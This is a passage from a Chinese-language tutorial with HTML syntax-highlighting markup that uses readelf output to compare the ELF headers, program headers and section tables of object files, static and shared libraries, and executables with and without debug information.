<strong>读取静态库文件形式的elf文件头信息：</strong> </p>\n<pre><code class=\"language-shell\"><span class=\"hljs-attribute\">[root@localhost test]$ readelf -h libmy.a \nFile</span><span class=\"hljs-punctuation\">:</span> <span class=\"hljs-string\">libmy.a(myfile.o) </span>\n<span class=\"hljs-attribute\">ELF Header</span><span class=\"hljs-punctuation\">: </span>\n  <span class=\"hljs-attribute\">Magic</span><span class=\"hljs-punctuation\">:</span> <span class=\"hljs-string\">  7f 45 4c 46 01 01 01 00 00 00 00 00 00 00 00 00 </span>\n  <span class=\"hljs-attribute\">Class</span><span class=\"hljs-punctuation\">:</span> <span class=\"hljs-string\">                            ELF32 </span>\n  <span class=\"hljs-attribute\">Data</span><span class=\"hljs-punctuation\">:</span> <span class=\"hljs-string\">                             2's complement, little endian </span>\n  <span class=\"hljs-attribute\">Version</span><span class=\"hljs-punctuation\">:</span> <span class=\"hljs-string\">                          1 (current) </span>\n  <span class=\"hljs-attribute\">OS/ABI</span><span class=\"hljs-punctuation\">:</span> <span class=\"hljs-string\">                           UNIX - System V </span>\n  <span class=\"hljs-attribute\">ABI Version</span><span class=\"hljs-punctuation\">:</span> <span class=\"hljs-string\">                      0 </span>\n  <span class=\"hljs-attribute\">Type</span><span class=\"hljs-punctuation\">:</span> <span class=\"hljs-string\">                             REL (Relocatable file) </span>\n  <span class=\"hljs-attribute\">Machine</span><span class=\"hljs-punctuation\">:</span> <span class=\"hljs-string\">                          Intel 80386 </span>\n  <span class=\"hljs-attribute\">Version</span><span class=\"hljs-punctuation\">:</span> <span class=\"hljs-string\">                          0x1 </span>\n  <span class=\"hljs-attribute\">Entry point address</span><span class=\"hljs-punctuation\">:</span> <span class=\"hljs-string\">              0x0 </span>\n  <span class=\"hljs-attribute\">Start of program headers</span><span class=\"hljs-punctuation\">:</span> <span class=\"hljs-string\">         0 (bytes into file) </span>\n  <span class=\"hljs-attribute\">Start of section headers</span><span class=\"hljs-punctuation\">:</span> <span class=\"hljs-string\">         516 (bytes into file) </span>\n  <span class=\"hljs-attribute\">Flags</span><span class=\"hljs-punctuation\">:</span> <span class=\"hljs-string\">                            0x0 </span>\n  <span class=\"hljs-attribute\">Size of this header</span><span class=\"hljs-punctuation\">:</span> <span class=\"hljs-string\">              52 (bytes) </span>\n  <span class=\"hljs-attribute\">Size of program headers</span><span class=\"hljs-punctuation\">:</span> <span class=\"hljs-string\">          0 (bytes) </span>\n  <span class=\"hljs-attribute\">Number of program headers</span><span class=\"hljs-punctuation\">:</span> <span class=\"hljs-string\">        0 </span>\n  <span class=\"hljs-attribute\">Size of section headers</span><span class=\"hljs-punctuation\">:</span> <span class=\"hljs-string\">          40 (bytes) </span>\n  <span class=\"hljs-attribute\">Number of section headers</span><span class=\"hljs-punctuation\">:</span> <span class=\"hljs-string\">        15 </span>\n  <span class=\"hljs-attribute\">Section header string table index</span><span class=\"hljs-punctuation\">:</span> <span class=\"hljs-string\">12 </span>\n</code></pre>\n<p>这里，可见静态库文件的elf文件，其类型为REL(可重定位文件)。&nbsp;</p>\n<p> <strong>读取动态库文件形式的elf文件头信息：</strong> </p>\n<pre><code class=\"language-shell\"><span class=\"hljs-attribute\">[root@localhost test]$ readelf -h libmy.so \nELF Header</span><span class=\"hljs-punctuation\">: </span>\n  <span class=\"hljs-attribute\">Magic</span><span class=\"hljs-punctuation\">:</span> <span class=\"hljs-string\">  7f 45 4c 46 01 01 01 00 00 00 00 00 00 00 00 00 </span>\n  <span class=\"hljs-attribute\">Class</span><span class=\"hljs-punctuation\">:</span> <span class=\"hljs-string\">                            ELF32 </span>\n  <span class=\"hljs-attribute\">Data</span><span class=\"hljs-punctuation\">:</span> <span class=\"hljs-string\">                             2's complement, little endian </span>\n  <span class=\"hljs-attribute\">Version</span><span class=\"hljs-punctuation\">:</span> <span class=\"hljs-string\">                          1 (current) </span>\n  <span class=\"hljs-attribute\">OS/ABI</span><span class=\"hljs-punctuation\">:</span> <span class=\"hljs-string\">                           UNIX - System V </span>\n  <span class=\"hljs-attribute\">ABI Version</span><span class=\"hljs-punctuation\">:</span> <span class=\"hljs-string\">                      0 </span>\n  <span class=\"hljs-attribute\">Type</span><span class=\"hljs-punctuation\">:</span> <span class=\"hljs-string\">                             DYN (Shared object file) </span>\n  <span class=\"hljs-attribute\">Machine</span><span class=\"hljs-punctuation\">:</span> <span class=\"hljs-string\">                          Intel 80386 </span>\n  <span class=\"hljs-attribute\">Version</span><span class=\"hljs-punctuation\">:</span> <span class=\"hljs-string\">                          0x1 </span>\n  <span class=\"hljs-attribute\">Entry point address</span><span class=\"hljs-punctuation\">:</span> <span class=\"hljs-string\">              0x550 </span>\n  <span class=\"hljs-attribute\">Start of program headers</span><span class=\"hljs-punctuation\">:</span> <span class=\"hljs-string\">         52 (bytes into file) </span>\n  <span class=\"hljs-attribute\">Start of section headers</span><span class=\"hljs-punctuation\">:</span> <span class=\"hljs-string\">         2768 (bytes into file) </span>\n  <span class=\"hljs-attribute\">Flags</span><span class=\"hljs-punctuation\">:</span> <span class=\"hljs-string\">                            0x0 </span>\n  <span class=\"hljs-attribute\">Size of this header</span><span class=\"hljs-punctuation\">:</span> <span class=\"hljs-string\">              52 (bytes) </span>\n  <span class=\"hljs-attribute\">Size of program headers</span><span class=\"hljs-punctuation\">:</span> <span class=\"hljs-string\">          32 (bytes) </span>\n  <span class=\"hljs-attribute\">Number of program headers</span><span class=\"hljs-punctuation\">:</span> <span class=\"hljs-string\">        5 </span>\n  <span class=\"hljs-attribute\">Size of section headers</span><span class=\"hljs-punctuation\">:</span> <span class=\"hljs-string\">          40 (bytes) </span>\n  <span class=\"hljs-attribute\">Number of section headers</span><span class=\"hljs-punctuation\">:</span> <span class=\"hljs-string\">        27 </span>\n  <span class=\"hljs-attribute\">Section header string table index</span><span class=\"hljs-punctuation\">:</span> <span class=\"hljs-string\">24 </span>\n</code></pre>\n<p>这里，可见动态库文件的elf文件，其类型为DYN(共享目标文件)。&nbsp;</p>\n<p> <strong>查看可执行的elf文件程序头表信息：</strong> </p>\n<pre><code class=\"language-shell\">[root@localhost test]$ readelf -l main \nElf file type is EXEC (Executable file) \nEntry point <span class=\"hljs-number\">0x8048580</span> \nThere are <span class=\"hljs-number\">8</span> program headers, starting at offset <span class=\"hljs-number\">52</span> \n\nProgram Headers: \n  Type           Offset   VirtAddr   PhysAddr   FileSiz MemSiz  Flg Align \n  PHDR           <span class=\"hljs-number\">0x000034</span> <span class=\"hljs-number\">0x08048034</span> <span class=\"hljs-number\">0x08048034</span> <span class=\"hljs-number\">0x00100</span> <span class=\"hljs-number\">0x00100</span> R E <span class=\"hljs-number\">0</span>x4 \n  INTERP         <span class=\"hljs-number\">0x000134</span> <span class=\"hljs-number\">0x08048134</span> <span class=\"hljs-number\">0x08048134</span> <span class=\"hljs-number\">0x00013</span> <span class=\"hljs-number\">0x00013</span> R   <span class=\"hljs-number\">0</span>x1 \n      Requesting program interpreter: /lib/[ld-linux.so.<span class=\"hljs-number\">2</span>] \n  LOAD           <span class=\"hljs-number\">0x000000</span> <span class=\"hljs-number\">0x08048000</span> <span class=\"hljs-number\">0x08048000</span> <span class=\"hljs-number\">0x00970</span> <span class=\"hljs-number\">0x00970</span> R E <span class=\"hljs-number\">0</span>x1000 \n  LOAD           <span class=\"hljs-number\">0x000970</span> <span class=\"hljs-number\">0x08049970</span> <span class=\"hljs-number\">0x08049970</span> <span class=\"hljs-number\">0x00130</span> <span class=\"hljs-number\">0x001c8</span> RW  <span class=\"hljs-number\">0</span>x1000 \n  DYNAMIC        <span class=\"hljs-number\">0x000988</span> <span class=\"hljs-number\">0x08049988</span> <span class=\"hljs-number\">0x08049988</span> <span class=\"hljs-number\">0x000e0</span> <span class=\"hljs-number\">0x000e0</span> RW  <span class=\"hljs-number\">0</span>x4 \n  NOTE           <span class=\"hljs-number\">0x000148</span> <span class=\"hljs-number\">0x08048148</span> <span class=\"hljs-number\">0x08048148</span> <span class=\"hljs-number\">0x00020</span> <span class=\"hljs-number\">0x00020</span> R   <span class=\"hljs-number\">0</span>x4 \n  GNU_EH_FRAME   <span class=\"hljs-number\">0x000820</span> <span class=\"hljs-number\">0x08048820</span> <span class=\"hljs-number\">0x08048820</span> <span class=\"hljs-number\">0x00044</span> <span class=\"hljs-number\">0x00044</span> R   <span class=\"hljs-number\">0</span>x4 \n  GNU_STACK      <span class=\"hljs-number\">0x000000</span> <span class=\"hljs-number\">0x00000000</span> <span class=\"hljs-number\">0x00000000</span> <span class=\"hljs-number\">0x00000</span> <span class=\"hljs-number\">0x00000</span> RW  <span class=\"hljs-number\">0</span>x4 \n\nSection to Segment mapping: \n  Segment Sections... \n   <span class=\"hljs-number\">00</span>     \n   <span class=\"hljs-number\">01</span>     .interp \n   <span class=\"hljs-number\">02</span>     .interp .note.ABI-tag .gnu.hash .dynsym .dynstr .gnu.version .gnu.version_r .rel.dyn .rel.plt .init .plt .text .fini .rodata .eh_frame_hdr .eh_frame \n   <span class=\"hljs-number\">03</span>     .ctors .dtors .jcr .dynamic .got .got.plt .data .bss \n   <span class=\"hljs-number\">04</span>     .dynamic \n   <span class=\"hljs-number\">05</span>     .note.ABI-tag \n   <span class=\"hljs-number\">06</span>     .eh_frame_hdr \n   <span class=\"hljs-number\">07</span>     \n</code></pre>\n<p>这里，含调试信息的\"main.debug\"和不含调试信息的\"main\"其内容是一样的。&nbsp;</p>\n<p> **查看目标文件的elf文件程序头表信息：&nbsp;** </p>\n<pre><code class=\"language-shell\">[root@localhost <span class=\"hljs-keyword\">test</span>]$ readelf -<span class=\"hljs-keyword\">l</span> myfile.o \nThere are <span class=\"hljs-keyword\">no</span> <span class=\"hljs-keyword\">program</span> headers <span class=\"hljs-keyword\">in</span> this <span class=\"hljs-keyword\">file</span>. \n</code></pre>\n<p>这里可知，可重定位的目标文件，它没程序头表。&nbsp;</p>\n<p> <strong>查看静态库文件的elf文件程序头表信息：</strong> </p>\n<pre><code class=\"language-shell\">[root@localhost <span class=\"hljs-keyword\">test</span>]$ readelf -<span class=\"hljs-keyword\">l</span> libmy.a \n<span class=\"hljs-keyword\">File</span>: libmy.a(myfile.o) \nThere are <span class=\"hljs-keyword\">no</span> <span class=\"hljs-keyword\">program</span> headers <span class=\"hljs-keyword\">in</span> this <span class=\"hljs-keyword\">file</span>. \n</code></pre>\n<p>这里可知，可重定位的静态库文件，它没程序头表。&nbsp;</p>\n<p> <strong>查看动态库文件的elf文件程序头表信息：</strong> </p>\n<pre><code class=\"language-shell\"><span class=\"hljs-selector-attr\">[root@localhost test]</span>$ readelf -l libmy<span class=\"hljs-selector-class\">.so</span> \nElf file type is DYN (Shared <span class=\"hljs-selector-tag\">object</span> file) \nEntry point <span class=\"hljs-number\">0</span>x550 \nThere are <span class=\"hljs-number\">5</span> program headers, starting at offset <span class=\"hljs-number\">52</span> \n\nProgram Headers: \n  Type           Offset   VirtAddr   PhysAddr   FileSiz MemSiz  Flg Align \n  LOAD           <span class=\"hljs-number\">0</span>x000000 <span class=\"hljs-number\">0</span>x00000000 <span class=\"hljs-number\">0</span>x00000000 <span class=\"hljs-number\">0</span>x007f4 <span class=\"hljs-number\">0</span>x007f4 R E <span class=\"hljs-number\">0</span>x1000 \n  LOAD           <span class=\"hljs-number\">0</span>x0007f4 <span class=\"hljs-number\">0</span>x000017f4 <span class=\"hljs-number\">0</span>x000017f4 <span class=\"hljs-number\">0</span>x0011c <span class=\"hljs-number\">0</span>x00128 RW  <span class=\"hljs-number\">0</span>x1000 \n  DYNAMIC        <span class=\"hljs-number\">0</span>x000810 <span class=\"hljs-number\">0</span>x00001810 <span class=\"hljs-number\">0</span>x00001810 <span class=\"hljs-number\">0</span>x000e0 <span class=\"hljs-number\">0</span>x000e0 RW  <span class=\"hljs-number\">0</span>x4 \n  GNU_EH_FRAME   <span class=\"hljs-number\">0</span>x000738 <span class=\"hljs-number\">0</span>x00000738 <span class=\"hljs-number\">0</span>x00000738 <span class=\"hljs-number\">0</span>x0002c <span class=\"hljs-number\">0</span>x0002c R   <span class=\"hljs-number\">0</span>x4 \n  GNU_STACK      <span class=\"hljs-number\">0</span>x000000 <span class=\"hljs-number\">0</span>x00000000 <span class=\"hljs-number\">0</span>x00000000 <span class=\"hljs-number\">0</span>x00000 <span class=\"hljs-number\">0</span>x00000 RW  <span class=\"hljs-number\">0</span>x4 \n\nSection to Segment mapping: \n  Segment Sections... \n   <span class=\"hljs-number\">00</span>     <span class=\"hljs-selector-class\">.gnu</span><span class=\"hljs-selector-class\">.hash</span> <span class=\"hljs-selector-class\">.dynsym</span> <span class=\"hljs-selector-class\">.dynstr</span> <span class=\"hljs-selector-class\">.gnu</span><span class=\"hljs-selector-class\">.version</span> <span class=\"hljs-selector-class\">.gnu</span><span class=\"hljs-selector-class\">.version_r</span> <span class=\"hljs-selector-class\">.rel</span><span class=\"hljs-selector-class\">.dyn</span> <span class=\"hljs-selector-class\">.rel</span><span class=\"hljs-selector-class\">.plt</span> <span class=\"hljs-selector-class\">.init</span> <span class=\"hljs-selector-class\">.plt</span> <span class=\"hljs-selector-class\">.text</span> <span class=\"hljs-selector-class\">.fini</span> <span class=\"hljs-selector-class\">.rodata</span> <span class=\"hljs-selector-class\">.eh_frame_hdr</span> <span class=\"hljs-selector-class\">.eh_frame</span> \n   <span class=\"hljs-number\">01</span>     <span class=\"hljs-selector-class\">.ctors</span> <span class=\"hljs-selector-class\">.dtors</span> <span class=\"hljs-selector-class\">.jcr</span> <span class=\"hljs-selector-class\">.data</span><span class=\"hljs-selector-class\">.rel</span><span class=\"hljs-selector-class\">.ro</span> <span class=\"hljs-selector-class\">.dynamic</span> <span class=\"hljs-selector-class\">.got</span> <span class=\"hljs-selector-class\">.got</span><span class=\"hljs-selector-class\">.plt</span> <span class=\"hljs-selector-class\">.bss</span> \n   <span class=\"hljs-number\">02</span>     <span class=\"hljs-selector-class\">.dynamic</span> \n   <span class=\"hljs-number\">03</span>     <span class=\"hljs-selector-class\">.eh_frame_hdr</span> \n   <span class=\"hljs-number\">04</span>     \n</code></pre>\n<p>这里可知，做为共享目标文件的动态库，它程序头表。&nbsp;</p>\n<p> <strong>查看一个可执行的elf文件的节信息：</strong> </p>\n<pre><code class=\"language-shell\">[root@localhost test]$ readelf -S main \nThere are<span class=\"hljs-number\"> 29 </span>section headers, starting at offset 0xca0: \nSection Headers: \n  [Nr] Name              Type            Addr     Off    Size   ES Flg Lk Inf Al \n  [ 0]                   NULL           <span class=\"hljs-number\"> 00000000 </span>000000<span class=\"hljs-number\"> 000000 </span>00     <span class=\"hljs-number\"> 0 </span> <span class=\"hljs-number\"> 0 </span><span class=\"hljs-number\"> 0 </span>\n  [ 1] .interp           PROGBITS       <span class=\"hljs-number\"> 08048134 </span>000134<span class=\"hljs-number\"> 000013 </span>00   A <span class=\"hljs-number\"> 0 </span> <span class=\"hljs-number\"> 0 </span><span class=\"hljs-number\"> 1 </span>\n  [ 2] .note.ABI-tag     NOTE           <span class=\"hljs-number\"> 08048148 </span>000148<span class=\"hljs-number\"> 000020 </span>00   A <span class=\"hljs-number\"> 0 </span> <span class=\"hljs-number\"> 0 </span><span class=\"hljs-number\"> 4 </span>\n  [ 3] .gnu.hash         GNU_HASH       <span class=\"hljs-number\"> 08048168 </span>000168<span class=\"hljs-number\"> 000030 </span>04   A <span class=\"hljs-number\"> 4 </span> <span class=\"hljs-number\"> 0 </span><span class=\"hljs-number\"> 4 </span>\n  [ 4] .dynsym           DYNSYM         <span class=\"hljs-number\"> 08048198 </span>000198 0000d0<span class=\"hljs-number\"> 10 </span>  A <span class=\"hljs-number\"> 5 </span> <span class=\"hljs-number\"> 1 </span><span class=\"hljs-number\"> 4 </span>\n  [ 5] .dynstr           STRTAB         <span class=\"hljs-number\"> 08048268 </span>000268<span class=\"hljs-number\"> 000183 </span>00   A <span class=\"hljs-number\"> 0 </span> <span class=\"hljs-number\"> 0 </span><span class=\"hljs-number\"> 1 </span>\n  [ 6] .gnu.version      VERSYM          080483ec 0003ec 00001a<span class=\"hljs-number\"> 02 </span>  A <span class=\"hljs-number\"> 4 </span> <span class=\"hljs-number\"> 0 </span><span class=\"hljs-number\"> 2 </span>\n  [ 7] .gnu.version_r    VERNEED        <span class=\"hljs-number\"> 08048408 </span>000408<span class=\"hljs-number\"> 000060 </span>00   A <span class=\"hljs-number\"> 5 </span> <span class=\"hljs-number\"> 2 </span><span class=\"hljs-number\"> 4 </span>\n  [ 8] .rel.dyn          REL            <span class=\"hljs-number\"> 08048468 </span>000468<span class=\"hljs-number\"> 000010 </span>08   A <span class=\"hljs-number\"> 4 </span> <span class=\"hljs-number\"> 0 </span><span class=\"hljs-number\"> 4 </span>\n  [ 9] .rel.plt          REL            <span class=\"hljs-number\"> 08048478 </span>000478<span class=\"hljs-number\"> 000048 </span>08   A <span class=\"hljs-number\"> 4 </span><span class=\"hljs-number\"> 11 </span><span class=\"hljs-number\"> 4 </span>\n  [10] .init             PROGBITS        080484c0 0004c0<span class=\"hljs-number\"> 000017 </span>00  AX <span class=\"hljs-number\"> 0 </span> <span class=\"hljs-number\"> 0 </span><span class=\"hljs-number\"> 4 </span>\n  [11] .plt              PROGBITS        080484d8 0004d8 0000a0<span class=\"hljs-number\"> 04 </span> AX <span class=\"hljs-number\"> 0 </span> <span class=\"hljs-number\"> 0 </span><span class=\"hljs-number\"> 4 </span>\n  [12] .text             PROGBITS       <span class=\"hljs-number\"> 08048580 </span>000580<span class=\"hljs-number\"> 000268 </span>00  AX <span class=\"hljs-number\"> 0 </span> <span class=\"hljs-number\"> 0 </span>16 \n  [13] .fini             PROGBITS        080487e8 0007e8 00001c<span class=\"hljs-number\"> 00 </span> AX <span class=\"hljs-number\"> 0 </span> <span class=\"hljs-number\"> 0 </span><span class=\"hljs-number\"> 4 </span>\n  [14] .rodata           PROGBITS       <span class=\"hljs-number\"> 08048804 </span>000804 00001a<span class=\"hljs-number\"> 00 </span>  A <span class=\"hljs-number\"> 0 </span> <span class=\"hljs-number\"> 0 </span><span class=\"hljs-number\"> 4 </span>\n  [15] .eh_frame_hdr     PROGBITS       <span class=\"hljs-number\"> 08048820 </span>000820<span class=\"hljs-number\"> 000044 </span>00   A <span class=\"hljs-number\"> 0 </span> <span class=\"hljs-number\"> 0 </span><span class=\"hljs-number\"> 4 </span>\n  [16] .eh_frame         PROGBITS       <span class=\"hljs-number\"> 08048864 </span>000864 00010c<span class=\"hljs-number\"> 00 </span>  A <span class=\"hljs-number\"> 0 </span> <span class=\"hljs-number\"> 0 </span><span class=\"hljs-number\"> 4 </span>\n  [17] .ctors            PROGBITS       <span class=\"hljs-number\"> 08049970 </span>000970 00000c<span class=\"hljs-number\"> 00 </span> WA <span class=\"hljs-number\"> 0 </span> <span class=\"hljs-number\"> 0 </span><span class=\"hljs-number\"> 4 </span>\n  [18] .dtors            PROGBITS        0804997c 00097c<span class=\"hljs-number\"> 000008 </span>00  WA <span class=\"hljs-number\"> 0 </span> <span class=\"hljs-number\"> 0 </span><span class=\"hljs-number\"> 4 </span>\n  [19] .jcr              PROGBITS       <span class=\"hljs-number\"> 08049984 </span>000984<span class=\"hljs-number\"> 000004 </span>00  WA <span class=\"hljs-number\"> 0 </span> <span class=\"hljs-number\"> 0 </span><span class=\"hljs-number\"> 4 </span>\n  [20] .dynamic          DYNAMIC        <span class=\"hljs-number\"> 08049988 </span>000988 0000e0<span class=\"hljs-number\"> 08 </span> WA <span class=\"hljs-number\"> 5 </span> <span class=\"hljs-number\"> 0 </span><span class=\"hljs-number\"> 4 </span>\n  [21] .got              PROGBITS        08049a68 000a68<span class=\"hljs-number\"> 000004 </span>04  WA <span class=\"hljs-number\"> 0 </span> <span class=\"hljs-number\"> 0 </span><span class=\"hljs-number\"> 4 </span>\n  [22] .got.plt          PROGBITS        08049a6c 000a6c<span class=\"hljs-number\"> 000030 </span>04  WA <span class=\"hljs-number\"> 0 </span> <span class=\"hljs-number\"> 0 </span><span class=\"hljs-number\"> 4 </span>\n  [23] .data             PROGBITS        08049a9c 000a9c<span class=\"hljs-number\"> 000004 </span>00  WA <span class=\"hljs-number\"> 0 </span> <span class=\"hljs-number\"> 0 </span><span class=\"hljs-number\"> 4 </span>\n  [24] .bss              NOBITS          08049aa0 000aa0<span class=\"hljs-number\"> 000098 </span>00  WA <span class=\"hljs-number\"> 0 </span> <span class=\"hljs-number\"> 0 </span><span class=\"hljs-number\"> 8 </span>\n  [25] .comment          PROGBITS       <span class=\"hljs-number\"> 00000000 </span>000aa0<span class=\"hljs-number\"> 000114 </span>00     <span class=\"hljs-number\"> 0 </span> <span class=\"hljs-number\"> 0 </span><span class=\"hljs-number\"> 1 </span>\n  [26] .shstrtab         STRTAB         <span class=\"hljs-number\"> 00000000 </span>000bb4 0000e9<span class=\"hljs-number\"> 00 </span>    <span class=\"hljs-number\"> 0 </span> <span class=\"hljs-number\"> 0 </span><span class=\"hljs-number\"> 1 </span>\n  [27] .symtab           SYMTAB         <span class=\"hljs-number\"> 00000000 </span>001128<span class=\"hljs-number\"> 000510 </span>10    <span class=\"hljs-number\"> 28 </span><span class=\"hljs-number\"> 53 </span><span class=\"hljs-number\"> 4 </span>\n  [28] .strtab           STRTAB         <span class=\"hljs-number\"> 00000000 </span>001638 0003f4<span class=\"hljs-number\"> 00 </span>    <span class=\"hljs-number\"> 0 </span> <span class=\"hljs-number\"> 0 </span><span class=\"hljs-number\"> 1 </span>\nKey to Flags: \n  W (write), A (alloc), X (execute), M (merge), S (strings) \n  I (info), L (link order), G (group), x (unknown) \n  O (extra OS processing required) o (OS specific), p (processor specific) \n</code></pre>\n<p>这里，main是可执行文件，不含调试信息。&nbsp;</p>\n<p> <strong>查看一个包含调试信息的可执行的elf文件的节信息：</strong> </p>\n<pre><code class=\"language-shell\">[root@localhost test]$ readelf -S main.debug \nThere are<span class=\"hljs-number\"> 37 </span>section headers, starting at offset 0x88c8: \n\nSection Headers: \n  [Nr] Name              Type            Addr     Off    Size   ES Flg Lk Inf Al \n  [ 0]                   NULL           <span class=\"hljs-number\"> 00000000 </span>000000<span class=\"hljs-number\"> 000000 </span>00     <span class=\"hljs-number\"> 0 </span> <span class=\"hljs-number\"> 0 </span><span class=\"hljs-number\"> 0 </span>\n  [ 1] .interp           PROGBITS       <span class=\"hljs-number\"> 08048134 </span>000134<span class=\"hljs-number\"> 000013 </span>00   A <span class=\"hljs-number\"> 0 </span> <span class=\"hljs-number\"> 0 </span><span class=\"hljs-number\"> 1 </span>\n  [ 2] .note.ABI-tag     NOTE           <span class=\"hljs-number\"> 08048148 </span>000148<span class=\"hljs-number\"> 000020 </span>00   A <span class=\"hljs-number\"> 0 </span> <span class=\"hljs-number\"> 0 </span><span class=\"hljs-number\"> 4 </span>\n  [ 3] .gnu.hash         GNU_HASH       <span class=\"hljs-number\"> 08048168 </span>000168<span class=\"hljs-number\"> 000030 </span>04   A <span class=\"hljs-number\"> 4 </span> <span class=\"hljs-number\"> 0 </span><span class=\"hljs-number\"> 4 </span>\n  [ 4] .dynsym           DYNSYM         <span class=\"hljs-number\"> 08048198 </span>000198 0000d0<span class=\"hljs-number\"> 10 </span>  A <span class=\"hljs-number\"> 5 </span> <span class=\"hljs-number\"> 1 </span><span class=\"hljs-number\"> 4 </span>\n  [ 5] .dynstr           STRTAB         <span class=\"hljs-number\"> 08048268 </span>000268<span class=\"hljs-number\"> 000183 </span>00   A <span class=\"hljs-number\"> 0 </span> <span class=\"hljs-number\"> 0 </span><span class=\"hljs-number\"> 1 </span>\n  [ 6] .gnu.version      VERSYM          080483ec 0003ec 00001a<span class=\"hljs-number\"> 02 </span>  A <span class=\"hljs-number\"> 4 </span> <span class=\"hljs-number\"> 0 </span><span class=\"hljs-number\"> 2 </span>\n  [ 7] .gnu.version_r    VERNEED        <span class=\"hljs-number\"> 08048408 </span>000408<span class=\"hljs-number\"> 000060 </span>00   A <span class=\"hljs-number\"> 5 </span> <span class=\"hljs-number\"> 2 </span><span class=\"hljs-number\"> 4 </span>\n  [ 8] .rel.dyn          REL            <span class=\"hljs-number\"> 08048468 </span>000468<span class=\"hljs-number\"> 000010 </span>08   A <span class=\"hljs-number\"> 4 </span> <span class=\"hljs-number\"> 0 </span><span class=\"hljs-number\"> 4 </span>\n  [ 9] .rel.plt          REL            <span class=\"hljs-number\"> 08048478 </span>000478<span class=\"hljs-number\"> 000048 </span>08   A <span class=\"hljs-number\"> 4 </span><span class=\"hljs-number\"> 11 </span><span class=\"hljs-number\"> 4 </span>\n  [10] .init             PROGBITS        080484c0 0004c0<span class=\"hljs-number\"> 000017 </span>00  AX <span class=\"hljs-number\"> 0 </span> <span class=\"hljs-number\"> 0 </span><span class=\"hljs-number\"> 4 </span>\n  [11] .plt              PROGBITS        080484d8 0004d8 0000a0<span class=\"hljs-number\"> 04 </span> AX <span class=\"hljs-number\"> 0 </span> <span class=\"hljs-number\"> 0 </span><span class=\"hljs-number\"> 4 </span>\n  [12] .text             PROGBITS       <span class=\"hljs-number\"> 08048580 </span>000580<span class=\"hljs-number\"> 000268 </span>00  AX <span class=\"hljs-number\"> 0 </span> <span class=\"hljs-number\"> 0 </span>16 \n  [13] .fini             PROGBITS        080487e8 0007e8 00001c<span class=\"hljs-number\"> 00 </span> AX <span class=\"hljs-number\"> 0 </span> <span class=\"hljs-number\"> 0 </span><span class=\"hljs-number\"> 4 </span>\n  [14] .rodata           PROGBITS       <span class=\"hljs-number\"> 08048804 </span>000804 00001a<span class=\"hljs-number\"> 00 </span>  A <span class=\"hljs-number\"> 0 </span> <span class=\"hljs-number\"> 0 </span><span class=\"hljs-number\"> 4 </span>\n  [15] .eh_frame_hdr     PROGBITS       <span class=\"hljs-number\"> 08048820 </span>000820<span class=\"hljs-number\"> 000044 </span>00   A <span class=\"hljs-number\"> 0 </span> <span class=\"hljs-number\"> 0 </span><span class=\"hljs-number\"> 4 </span>\n  [16] .eh_frame         PROGBITS       <span class=\"hljs-number\"> 08048864 </span>000864 00010c<span class=\"hljs-number\"> 00 </span>  A <span class=\"hljs-number\"> 0 </span> <span class=\"hljs-number\"> 0 </span><span class=\"hljs-number\"> 4 </span>\n  [17] .ctors            PROGBITS       <span class=\"hljs-number\"> 08049970 </span>000970 00000c<span class=\"hljs-number\"> 00 </span> WA <span class=\"hljs-number\"> 0 </span> <span class=\"hljs-number\"> 0 </span><span class=\"hljs-number\"> 4 </span>\n  [18] .dtors            PROGBITS        0804997c 00097c<span class=\"hljs-number\"> 000008 </span>00  WA <span class=\"hljs-number\"> 0 </span> <span class=\"hljs-number\"> 0 </span><span class=\"hljs-number\"> 4 </span>\n  [19] .jcr              PROGBITS       <span class=\"hljs-number\"> 08049984 </span>000984<span class=\"hljs-number\"> 000004 </span>00  WA <span class=\"hljs-number\"> 0 </span> <span class=\"hljs-number\"> 0 </span><span class=\"hljs-number\"> 4 </span>\n  [20] .dynamic          DYNAMIC        <span class=\"hljs-number\"> 08049988 </span>000988 0000e0<span class=\"hljs-number\"> 08 </span> WA <span class=\"hljs-number\"> 5 </span> <span class=\"hljs-number\"> 0 </span><span class=\"hljs-number\"> 4 </span>\n  [21] .got              PROGBITS        08049a68 000a68<span class=\"hljs-number\"> 000004 </span>04  WA <span class=\"hljs-number\"> 0 </span> <span class=\"hljs-number\"> 0 </span><span class=\"hljs-number\"> 4 </span>\n  [22] .got.plt          PROGBITS        08049a6c 000a6c<span class=\"hljs-number\"> 000030 </span>04  WA <span class=\"hljs-number\"> 0 </span> <span class=\"hljs-number\"> 0 </span><span class=\"hljs-number\"> 4 </span>\n  [23] .data             PROGBITS        08049a9c 000a9c<span class=\"hljs-number\"> 000004 </span>00  WA <span class=\"hljs-number\"> 0 </span> <span class=\"hljs-number\"> 0 </span><span class=\"hljs-number\"> 4 </span>\n  [24] .bss              NOBITS          08049aa0 000aa0<span class=\"hljs-number\"> 000098 </span>00  WA <span class=\"hljs-number\"> 0 </span> <span class=\"hljs-number\"> 0 </span><span class=\"hljs-number\"> 8 </span>\n  [25] .comment          PROGBITS       <span class=\"hljs-number\"> 00000000 </span>000aa0<span class=\"hljs-number\"> 000114 </span>00     <span class=\"hljs-number\"> 0 </span> <span class=\"hljs-number\"> 0 </span><span class=\"hljs-number\"> 1 </span>\n  [26] .debug_aranges    PROGBITS       <span class=\"hljs-number\"> 00000000 </span>000bb4<span class=\"hljs-number\"> 000020 </span>00     <span class=\"hljs-number\"> 0 </span> <span class=\"hljs-number\"> 0 </span><span class=\"hljs-number\"> 1 </span>\n  [27] .debug_pubnames   PROGBITS       <span class=\"hljs-number\"> 00000000 </span>000bd4<span class=\"hljs-number\"> 000028 </span>00     <span class=\"hljs-number\"> 0 </span> <span class=\"hljs-number\"> 0 </span><span class=\"hljs-number\"> 1 </span>\n  [28] .debug_info       PROGBITS       <span class=\"hljs-number\"> 00000000 </span>000bfc 0067aa<span class=\"hljs-number\"> 00 </span>    <span class=\"hljs-number\"> 0 </span> <span class=\"hljs-number\"> 0 </span><span class=\"hljs-number\"> 1 </span>\n  [29] .debug_abbrev     PROGBITS       <span class=\"hljs-number\"> 00000000 </span>0073a6<span class=\"hljs-number\"> 000726 </span>00     <span class=\"hljs-number\"> 0 </span> <span class=\"hljs-number\"> 0 </span><span class=\"hljs-number\"> 1 </span>\n  [30] .debug_line       PROGBITS       <span class=\"hljs-number\"> 00000000 </span>007acc 0003e1<span class=\"hljs-number\"> 00 </span>    <span class=\"hljs-number\"> 0 </span> <span class=\"hljs-number\"> 0 </span><span class=\"hljs-number\"> 1 </span>\n  [31] .debug_frame      PROGBITS       <span class=\"hljs-number\"> 00000000 </span>007eb0 00009c<span class=\"hljs-number\"> 00 </span>    <span class=\"hljs-number\"> 0 </span> <span class=\"hljs-number\"> 0 